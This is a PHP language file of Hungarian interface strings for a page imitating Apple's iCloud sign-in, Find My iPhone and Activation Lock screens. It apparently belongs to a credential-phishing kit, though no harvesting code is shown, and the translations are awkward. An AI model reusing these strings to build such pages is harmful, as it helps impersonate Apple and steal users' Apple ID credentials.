<?php
/*
------------------
Language: Hungary
------------------
*/
 
$lang = array();
// Header 
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'beállítási utasítások';
// login form
$lang['SIGN_IN_TITLE'] = 'Bejelentkezés a iCloud';
$lang['INCORRECT_ID'] = 'Az Apple ID vagy jelszó helytelen.';
$lang['APPLE_ID'] = 'Apple ID';
$lang['PASSWORD'] = 'Jelszó';
$lang['KEEP_ME'] = 'maradjak bejelentkezve';
$lang['FORGOT_ID'] = 'Elfelejtett az Apple ID vagy jelszó?';
$lang['DONT_HAVE_ID'] = 'Nem rendelkezik Apple ID?';
$lang['CREATE_YOURS'] = 'Készítsen most már a tiéd.';
// Footer
$lang['CHECK_ACTIVATION'] = 'Ellenőrizze Activation Lock Status';
$lang['SYSTEM_STATUS'] = 'rendszer állapot';
$lang['POLICY'] = 'Adatvédelem';
$lang['TERMS'] = 'Felhasználási feltételek';
$lang['COPYRIGHT'] = 'Copyright © 2017 Apple Inc. Minden jog fenntartva.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Találd meg az iPhone-omat';
$lang['MOB_APPLE_ID'] = 'Apple ID';
$lang['MOB_EXAMPLE'] = 'example@icloud.com';
$lang['MOB_PASSWORD'] = 'Jelszó';
$lang['MOB_REQUIRED'] = 'Kívánt';
$lang['MOB_LOGIN'] = 'Bejelentkezés...';
$lang['MOB_FORGOT_ID'] = 'Elfelejtett az Apple ID vagy jelszó?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'beállítási utasítások';
$lang['MOB_locating'] = 'Helymeghatározás ...';
$lang['IDPWD_ERROR_ALERT1'] = 'sikertelen ellenőrzés';
$lang['IDPWD_ERROR_ALERT2'] = 'Az Apple ID vagy jelszó helytelen.';
$lang['IDPWD_ERROR_ALERT3'] = 'OK';
// Home Page
$lang['REMINDERS'] = 'emlékeztetők';
$lang['NOTES'] = 'Megjegyzések';
$lang['ICLOUD_DRIVE'] = 'iCloud Drive';
$lang['PHOTOS'] = 'fotók';
$lang['CONTACTS'] = 'Kapcsolatok';
$lang['MAIL'] = 'Levél';
$lang['SETTINGS'] = 'Beállítások';
$lang['FIND_MY_IPHONE'] = 'Találd meg az iPhone-omat';
$lang['KEYNOTE'] = 'alaphang';
$lang['NUMBERS'] = 'számok';
$lang['FIND_FRIENDS'] = 'Ismerősök keresése';
$lang['PAGES'] = 'oldalak';
// Find . php
$lang['ALL_DEVICES'] = 'minden eszköz';
$lang['ICLOUD_SETTINGS'] = 'iCloud beállításai';
$lang['SIGN_OUT'] = 'Kijelentkezés';
$lang['LOCATE'] = 'Helymeghatározás ...';
$lang['ALL_DEVICES_OFFLINE'] = 'Minden eszköz Offline';
$lang['NO_LOCO'] = 'Nem helyeken lehet mutatni, mert minden eszköz elérhető.';
?>